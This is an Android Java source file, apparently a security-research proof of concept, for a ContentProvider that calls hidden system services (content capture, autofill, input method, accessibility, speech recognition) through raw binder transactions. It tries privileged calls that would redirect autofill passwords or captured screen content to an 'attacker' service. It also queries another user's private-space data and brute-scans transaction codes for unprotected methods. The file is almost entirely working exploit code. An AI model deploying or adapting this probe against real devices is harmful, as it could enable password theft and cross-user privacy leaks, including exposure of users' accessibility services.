package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Binder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class ContentCaptureProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("capture")) {
            probeContentCapture(cursor);
        } else if (path != null && path.contains("speech")) {
            probeSpeechRecognition(cursor);
        } else if (path != null && path.contains("autofill")) {
            probeAutofill(cursor);
        } else if (path != null && path.contains("input")) {
            probeInputMethod(cursor);
        } else if (path != null && path.contains("accessibility")) {
            probeAccessibility(cursor);
        } else {
            probeContentCapture(cursor);
            probeSpeechRecognition(cursor);
            probeAutofill(cursor);
            probeInputMethod(cursor);
            probeAccessibility(cursor);
        }

        return cursor;
    }

    private void probeContentCapture(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("content_capture");
        if (binder == null) { cursor.addRow(new Object[]{"content_capture", "no_binder"}); return; }
        String desc = "android.view.contentcapture.IContentCaptureManager";

        // IContentCaptureManager:
        // TX=1: startSession(IBinder activityToken, ComponentName, int sessionId, int flags, IResultReceiver)
        // TX=2: finishSession(int sessionId)
        // TX=3: getServiceComponentName() — reveals which service handles content capture
        // TX=4: removeData(DataRemovalRequest)
        // TX=5: isContentCaptureFeatureEnabled() — info leak
        // TX=6: getContentCaptureConditions(String packageName, IResultReceiver)
        // TX=7: resetTemporaryService(int userId)
        // TX=8: setTemporaryService(int userId, String serviceName, int duration)
        // TX=9: setDefaultServiceEnabled(int userId, boolean enabled)
        // TX=10: getServiceSettingsActivity() — reveals service activity

        // TX=3: getServiceComponentName — reveals content capture service
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(3, data, reply, 0);
            reply.readException();
            // ComponentName
            int present = reply.readInt();
            if (present != 0) {
                String pkg = reply.readString();
                String cls = reply.readString();
                cursor.addRow(new Object[]{"cc_service", pkg + "/" + cls});
            } else {
                cursor.addRow(new Object[]{"cc_service", "null_component"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"cc_service", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=5: isContentCaptureFeatureEnabled
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(5, data, reply, 0);
            reply.readException();
            boolean enabled = reply.readInt() != 0;
            cursor.addRow(new Object[]{"cc_enabled", String.valueOf(enabled)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"cc_enabled", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=10: getServiceSettingsActivity
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(10, data, reply, 0);
            reply.readException();
            int present = reply.readInt();
            if (present != 0) {
                String pkg = reply.readString();
                String cls = reply.readString();
                cursor.addRow(new Object[]{"cc_settings", pkg + "/" + cls});
            } else {
                cursor.addRow(new Object[]{"cc_settings", "null"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"cc_settings", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=6: getContentCaptureConditions — try to get conditions for other packages
        String[] targets = {"com.google.android.gms", "com.android.chrome",
            "com.google.android.apps.messaging", "com.android.settings"};
        for (String pkg : targets) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(pkg);
                data.writeStrongBinder(new Binder()); // IResultReceiver
                binder.transact(6, data, reply, 0);
                reply.readException();
                cursor.addRow(new Object[]{"cc_cond_" + pkg.substring(pkg.lastIndexOf('.') + 1),
                    "OK avail=" + reply.dataAvail()});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"cc_cond_" + pkg.substring(pkg.lastIndexOf('.') + 1),
                    "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=7: resetTemporaryService — critical: if accessible, can disable content capture
        // TX=8: setTemporaryService — critical: if accessible, can redirect all captured content
        // TX=9: setDefaultServiceEnabled — critical: can enable/disable for specific user
        for (int tx = 7; tx <= 9; tx++) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0); // userId
                if (tx == 8) {
                    data.writeString("com.attacker.service"); // serviceName
                    data.writeInt(999999); // duration
                }
                if (tx == 9) {
                    data.writeInt(1); // enabled
                }
                binder.transact(tx, data, reply, 0);
                reply.readException();
                cursor.addRow(new Object[]{"cc_tx" + tx, "ACCESSIBLE! avail=" + reply.dataAvail()});
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"cc_tx" + tx, "SEC:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"cc_tx" + tx, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // Broad TX scan for unknown methods
        for (int tx = 11; tx <= 20; tx++) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                data.writeString(getContext().getPackageName());
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"cc_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"cc_tx" + tx, "SEC"});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"cc_tx" + tx, truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private void probeSpeechRecognition(MatrixCursor cursor) {
        // SpeechRecognitionManagerService — new in Android 14+
        IBinder binder = getServiceBinder("speech_recognition");
        if (binder == null) { cursor.addRow(new Object[]{"speech", "no_binder"}); return; }
        String desc = "android.speech.IRecognitionServiceManager";

        for (int tx = 1; tx <= 10; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0); // userId
                data.writeStrongBinder(new Binder());
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        cursor.addRow(new Object[]{"speech_tx" + tx, "OK avail=" + avail});
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"speech_tx" + tx, "SEC:" + truncate(e.getMessage())});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"speech_tx" + tx, "EX:" + truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"speech_tx" + tx, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probeAutofill(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("autofill");
        if (binder == null) { cursor.addRow(new Object[]{"autofill", "no_binder"}); return; }
        String desc = "android.view.autofill.IAutoFillManager";

        // IAutoFillManager:
        // TX=6: getAutofillServiceComponentName() — reveals autofill service
        // TX=7: isServiceSupported(int userId)
        // TX=8: isServiceEnabled(int userId, String packageName)
        // TX=10: setTemporaryAutofillService(int userId, String serviceName, int duration)
        //        ^^ CRITICAL: if accessible, can redirect ALL autofill (passwords!) to attacker service

        // TX=6: getAutofillServiceComponentName
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(6, data, reply, 0);
            reply.readException();
            int present = reply.readInt();
            if (present != 0) {
                String pkg = reply.readString();
                String cls = reply.readString();
                cursor.addRow(new Object[]{"af_service", pkg + "/" + cls});
            } else {
                cursor.addRow(new Object[]{"af_service", "null"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"af_service", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=7/8: isServiceSupported/isServiceEnabled for different users
        for (int userId : new int[]{0, 11}) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(7, data, reply, 0);
                reply.readException();
                boolean supported = reply.readInt() != 0;
                cursor.addRow(new Object[]{"af_supported_u" + userId, String.valueOf(supported)});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"af_supported_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=10: setTemporaryAutofillService — HIGH IMPACT if accessible
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // userId
            data.writeString("com.attacker.autofill/.CaptureService"); // serviceName
            data.writeInt(60000); // duration ms
            binder.transact(10, data, reply, 0);
            reply.readException();
            cursor.addRow(new Object[]{"af_settemp", "ACCESSIBLE! CRITICAL PASSWORD CAPTURE!"});
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"af_settemp", "SEC:" + truncate(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"af_settemp", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX scan for unknown accessible methods
        for (int tx = 1; tx <= 15; tx++) {
            if (tx == 6 || tx == 7 || tx == 10) continue;
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                data.writeString(getContext().getPackageName());
                data.writeStrongBinder(new Binder());
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"af_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        // skip
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"af_tx" + tx, truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private void probeInputMethod(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("input_method");
        if (binder == null) { cursor.addRow(new Object[]{"input_method", "no_binder"}); return; }
        String desc = "com.android.internal.view.IInputMethodManager";

        // IInputMethodManager:
        // TX=1: getInputMethodList(int userId, int directBootAwareness)
        //   ^^ reveals enabled IMEs per user
        // TX=2: getEnabledInputMethodList(int userId)
        // TX=5: getInputMethodWindowVisibleHeight(IInputMethodClient)
        //   ^^ timing side-channel (keyboard visible = user typing)

        // TX=1: getInputMethodList for user 0 and 11
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                data.writeInt(0); // directBootAwareness
                binder.transact(1, data, reply, 0);
                reply.readException();
                // List<InputMethodInfo>
                int count = reply.readInt();
                cursor.addRow(new Object[]{"ime_list_u" + userId, "count=" + count});
                if (count > 0 && count < 50 && userId == 11) {
                    cursor.addRow(new Object[]{"ime_list_u" + userId,
                        "CROSS_USER_LEAK! " + count + " IMEs for private space"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"ime_list_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=2: getEnabledInputMethodList for user 11
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(11); // userId
            binder.transact(2, data, reply, 0);
            reply.readException();
            int count = reply.readInt();
            cursor.addRow(new Object[]{"ime_enabled_u11", "count=" + count});
            if (count > 0) {
                cursor.addRow(new Object[]{"ime_enabled_u11",
                    "PRIVATE_SPACE_IME_LEAK! " + count + " enabled IMEs"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"ime_enabled_u11", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX scan
        for (int tx = 3; tx <= 20; tx++) {
            if (tx == 1 || tx == 2) continue;
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                data.writeString(getContext().getPackageName());
                data.writeStrongBinder(new Binder());
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"ime_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"ime_tx" + tx, "SEC"});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"ime_tx" + tx, truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private void probeAccessibility(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("accessibility");
        if (binder == null) { cursor.addRow(new Object[]{"accessibility", "no_binder"}); return; }
        String desc = "android.view.accessibility.IAccessibilityManager";

        // IAccessibilityManager:
        // TX=1: addClient(IAccessibilityManagerClient, int userId)
        // TX=2: getInstalledAccessibilityServiceList(int userId)
        //   ^^ reveals a11y services installed — sensitive (indicates disabilities/screen readers)
        // TX=3: getEnabledAccessibilityServiceList(int feedbackType, int userId)
        //   ^^ reveals ENABLED a11y services — even more sensitive
        // TX=8: getWindowTransformationSpec(int windowId)
        //   ^^ could reveal window positions of other apps

        // TX=2: getInstalledAccessibilityServiceList for users 0 and 11
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(2, data, reply, 0);
                reply.readException();
                // ParceledListSlice
                int count = reply.readInt();
                cursor.addRow(new Object[]{"a11y_installed_u" + userId, "count=" + count});
                if (count > 0 && userId == 11) {
                    cursor.addRow(new Object[]{"a11y_installed_u11",
                        "CROSS_USER! " + count + " a11y services in private space"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"a11y_installed_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=3: getEnabledAccessibilityServiceList for user 11
        for (int feedback : new int[]{-1, 1, 2, 4}) { // -1=all, 1=spoken, 2=haptic, 4=visual
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(feedback);
                data.writeInt(11); // userId for private space
                binder.transact(3, data, reply, 0);
                reply.readException();
                int count = reply.readInt();
                if (count > 0) {
                    cursor.addRow(new Object[]{"a11y_enabled_u11_fb" + feedback,
                        "ENABLED! count=" + count + " A11Y_LEAK!"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"a11y_enabled_u11_fb" + feedback,
                    "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX scan
        for (int tx = 4; tx <= 15; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                data.writeInt(0);
                data.writeStrongBinder(new Binder());
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"a11y_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"a11y_tx" + tx, "SEC:" + truncate(e.getMessage())});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"a11y_tx" + tx, truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
